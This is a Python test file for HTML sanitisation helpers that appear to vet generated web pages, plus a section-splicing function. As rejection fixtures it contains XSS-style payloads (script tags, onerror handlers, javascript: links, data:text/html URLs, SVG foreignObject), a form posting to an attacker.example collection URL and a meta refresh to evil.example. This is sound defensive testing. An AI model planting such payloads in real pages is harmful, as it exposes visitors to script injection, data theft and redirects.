"""Pure orchestration helpers — no DB, no LLM."""

from __future__ import annotations

from app.services.orchestration.html_validate import (
    validate_generated_html,
    validate_publishable_html,
    validate_section_html,
)
from app.services.orchestration.section_editor import splice_section


def test_validate_generated_html_accepts_minimal_document() -> None:
    html = (
        """<!DOCTYPE html>
<html lang="en"><head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>T</title></head><body><p>"""
        + ("x" * 80)
        + """</p></body></html>"""
    )
    ok, reason = validate_generated_html(html)
    assert ok is True
    assert reason == ""


def test_validate_generated_html_rejects_script() -> None:
    html = (
        """<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width"></head>
<body><script>alert(1)</script>"""
        + ("y" * 80)
        + """</body></html>"""
    )
    ok, reason = validate_generated_html(html)
    assert ok is False
    assert "script" in reason.lower()


def test_validate_generated_html_rejects_event_handlers() -> None:
    html = (
        """<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width"></head>
<body><img src="https://example.com/a.png" onerror="alert(1)" alt="A">"""
        + ("y" * 80)
        + """</body></html>"""
    )
    ok, reason = validate_generated_html(html)
    assert ok is False
    assert "Event handler" in reason


def test_validate_generated_html_rejects_javascript_urls() -> None:
    html = (
        """<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width"></head>
<body><a href="javascript:alert(1)">Click</a>"""
        + ("y" * 80)
        + """</body></html>"""
    )
    ok, reason = validate_generated_html(html)
    assert ok is False
    assert "javascript" in reason


def test_validate_generated_html_allows_image_data_urls_only() -> None:
    html = (
        """<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width"></head>
<body><img alt="Inline" src="data:image/png;base64,abc">"""
        + ("y" * 80)
        + """</body></html>"""
    )
    ok, reason = validate_generated_html(html)
    assert ok is True
    assert reason == ""

    bad = html.replace("data:image/png", "data:text/html")
    ok, reason = validate_generated_html(bad)
    assert ok is False
    assert "data:" in reason


def test_validate_generated_html_rejects_unsafe_svg_content() -> None:
    html = (
        """<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width"></head>
<body><svg><foreignObject><p>x</p></foreignObject></svg>"""
        + ("y" * 80)
        + """</body></html>"""
    )
    ok, reason = validate_generated_html(html)
    assert ok is False
    assert "SVG" in reason


def test_validate_publishable_html_rejects_hostile_form_action() -> None:
    html = (
        """<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width"></head>
<body><form action="https://attacker.example/collect"><button>Send</button></form>"""
        + ("y" * 80)
        + """</body></html>"""
    )
    ok, reason = validate_publishable_html(html)
    assert ok is False
    assert "Form action" in reason


def test_validate_publishable_html_rejects_meta_http_equiv() -> None:
    html = (
        """<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width">
<meta http-equiv="refresh" content="0;url=https://evil.example"></head>
<body><p>"""
        + ("y" * 80)
        + """</p></body></html>"""
    )
    ok, reason = validate_publishable_html(html)
    assert ok is False
    assert "http-equiv" in reason


def test_validate_section_html_rejects_script() -> None:
    ok, reason = validate_section_html("<div><script></script></div>")
    assert ok is False


def test_splice_section_replaces_target_block() -> None:
    full = (
        '<html><body>'
        '<section data-forge-section="a"><p>old</p></section>'
        '<section data-forge-section="b"><p>keep</p></section>'
        "</body></html>"
    )
    new = '<section data-forge-section="a"><p>new</p></section>'
    out = splice_section(full, "a", new)
    assert "new" in out
    assert "old" not in out
    assert "keep" in out


def test_splice_section_no_match_returns_unchanged() -> None:
    full = "<html><body><p>x</p></body></html>"
    assert splice_section(full, "missing", "<div/>") == full
